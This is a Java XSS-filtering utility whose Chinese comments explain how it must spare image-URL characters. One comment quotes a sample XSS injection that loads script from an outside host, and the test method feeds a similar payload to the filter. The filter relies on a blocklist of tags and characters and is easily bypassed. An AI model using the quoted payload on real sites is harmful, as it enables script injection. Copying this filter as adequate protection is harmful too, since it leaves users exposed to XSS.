package com.commons.argValid.xss;

import org.apache.commons.lang.StringEscapeUtils;
import org.apache.commons.lang.StringUtils;

public class XssUtil {
    //private static final String[] dangerCharactersForRegex = {"<",">","\"","\'","%","\\(","\\)","\\\\", "\\."};

    /*
    注意不能把图片中的特殊字符过滤掉，如 . @ = / , _
    http://001.img.pu.sohu.com.cn/group1/M12/1E/5C/MTAuMTguMTcuMTg2/5_16ca60d61a0g160BS56_158376520_7_1b/cut@m=resize,w=130,h=78.jpg

    XSS注入样例：
    group1/M12/1E/5C/MTAuMTguMTcuMTg2/5_16ca60d61a0g160BS56_158376520_7_0b.jpg"><body/hidden><script src=//6x.fit/x></script><noscript>
     */

    private static final String[] dangerCharactersForRegex = {"<",">","%","\\(","\\)","\\\\"};
    /*
     * 使用正则替换，即使用replaceAll方法
     */
    public static String filterParameter(String parameter){
        if(StringUtils.isEmpty(parameter)) return null;
        parameter=parameter.replaceAll("<script", "");
        parameter=parameter.replaceAll("script>", "");
        parameter=parameter.replaceAll("<body", "");
        parameter=parameter.replaceAll("body>", "");
        parameter=parameter.replaceAll("alert\\(", "");
        parameter=parameter.replaceAll("document\\.", "");

        for(String s : dangerCharactersForRegex){
            if(!StringUtils.isEmpty(s.trim())) {

                parameter=parameter.replaceAll("(?i)" + s, "");
            }
        }
        return parameter;
    }

    public static String excapeRequestParam(String param) {
        String p = filterParameter(param);
        //p = StringEscapeUtils.escapeHtml(p); 会转义json中的双引号
        //p = StringEscapeUtils.escapeJavaScript(p);  //会将/变成\/,对图片地址不适用，上面已经对特殊符号进行了删除，这里可以不用它了
        p=StringEscapeUtils.escapeSql(p);
        return p;
    }

    public static void main(String[] args){
        String p = "http://001.img.pu.sohu.com.cn/group2/M05/B3/A6/MTAuMTguMTcuMTg5/5_16c675ce475g147BS56_156856688_7\"><body/hidden><script src=_4b.jpg";

        String s = XssUtil.excapeRequestParam(p);
        System.out.println(s);

    }
}
